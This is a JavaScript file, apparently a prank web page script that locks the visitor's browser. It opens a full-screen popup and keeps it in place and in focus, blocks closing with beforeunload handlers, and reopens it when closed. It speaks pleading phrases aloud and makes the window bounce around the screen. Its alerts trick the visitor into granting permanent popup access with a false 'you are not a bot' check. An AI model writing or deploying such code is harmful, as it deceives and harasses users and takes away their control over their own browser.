let newWindow = null;
let messageInterval = null;

function onBeforeUnload(e) {
    if (true) {
        e.preventDefault();
        e.returnValue = 'nooo';
        speak('why leave now when you can stay on this website forever')
        newWindow.myFunc();
        return;
    }
}
function speak(phrase) {
    if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
    window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}
window.addEventListener('beforeunload', onBeforeUnload);
//hey update 
setTimeout(function() {
    let b = window.open('_blank')
    let a = window.open('_blank')
    alert("If two windows did not open, the webpage has errored, make sure to allow popup access, :)")
    if(a == nul || b == null ) {
        openCoveringWindow = function() {}
    }
},1000)


function openCoveringWindow() {
    const screenWidth = screen.availWidth;
    const screenHeight = screen.availHeight;

    newWindow = window.open('', '', `width=${screenWidth}, height=${screenHeight}, fullscreen=yes, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no`);

    if (newWindow) {
        newWindow.document.write(`
        <h1>focus needed: User is required to click to load the page.</h1>
        <script>
            var lastX = window.screenX; // Initialize lastX with initial position
            var lastY = window.screenY; // Initialize lastY with initial position
            let opennn = setInterval(function(){
                window.moveTo(lastX, lastY); // prevent moving the window
                window.resizeTo(${screenWidth}, ${screenHeight});
            }, 10);
            function resizeWindowPeriodically(window) {
                // Set the initial size and direction of resizing
                let width = window.innerWidth;
                let height = window.innerHeight;
                let increasing = true;
            
                // Function to toggle between increasing and decreasing size
                function toggleDirection() {
                    increasing = !increasing;
                }
            
                // Function to resize the window
                function resizeWindow() {
                    // Define the amount of change in size
                    const change = 50;
            
                    // Increase or decrease size based on the current direction
                    if (increasing) {
                        width += change;
                        height += change;
                    } else {
                        width -= change;
                        height -= change;
                    }
            
                    // Apply the new size to the window
                    window.resizeTo(width, height);
            
                    // Toggle direction every 5 seconds
                    setTimeout(toggleDirection, 5000);
                }
            }
            function runWay() {
                speak("please don't close me, I'm just a small annoying popup!")
                clearInterval(opennn);
                function normalize(number) {
                    if (number === 0) {
                        return 1;
                    } else {
                        return number / Math.abs(number);
                    }
                  }
                  var moveInterval = setInterval(movePopup, 50); // Adjust speed as needed
                  var randomX = Math.random() * 2 - 1; // Random number between -1 and 1
                  var randomY = Math.random() * 2 - 1; // Random number between -1 and 1
              
                  var speedX = normalize(randomX) * 40; // Initial speed in X direction
                  var speedY = normalize(randomY) * 40; // Initial speed in Y direction
              
                  var lastX = window.screenX; // Initialize lastX with initial position
                  var lastY = window.screenY; // Initialize lastY with initial position
                  function movePopup() {
                    speak("please don't close me, I'm just a small annoying popup!")
                    var newX = window.screenX + speedX;
                    var newY = window.screenY + speedY;
                    var screenWidth = window.screen.availWidth;
                    var screenHeight = window.screen.availHeight;
                    if (newX == lastX) {
                      speedX = -speedX; // Reverse X direction if hitting horizontal edges
                    }
                    if (newY == lastY) {
                      speedY = -speedY; // Reverse Y direction if hitting vertical edges
                    }
                    window.moveBy(speedX, speedY);
                    lastX = newX;
                    lastY = newY;
                    window.resizeTo(1, 1);
                  }    
                  function onBeforeUnload(e) {
                    if (true) {
                        e.preventDefault();
                        e.returnValue = '';
                        return;
                    }
                  }
            }            
            let oldC = 0;
            let newC = 1;
            let running = false;
            setInterval(function(){
                if(oldC == newC) {
                    runWay();
                    running = true;
                    console.log(oldC,newC)
                }
                oldC = newC
            },1000)
            window.addEventListener('message', function(event) {
                console.log("recievedMessage")
                newC+=1;
            });
            function speak(phrase) {
                if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
                window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
            }
        </script>
        `);
        newWindow.onbeforeunload = function () { return false; };
        try {
            setInterval(function () {
                newWindow.focus();
            }, 100);
        } catch (e) {
            console.error('Error focusing on the window:', e);
        }
        // Start sending messages to the opener window every 0.5 seconds
        messageInterval = setInterval(() => {
            if (newWindow) {
                newWindow.postMessage('Popup message', '*');
            }
        }, 500);
    } else {
        alert('Error: this page requires pop-ups to show its content, to make you are not a bot please allow this site to run popups as "Always." ');
    }
    newWindow.addEventListener('beforeunload', function (event) {
        // Reopen the covering window after a short delay
        setTimeout(openCoveringWindow, 10); // Adjust the delay as needed
    });
}

document.body.addEventListener('mousemove', function (event) {
    newWindow.focus();
});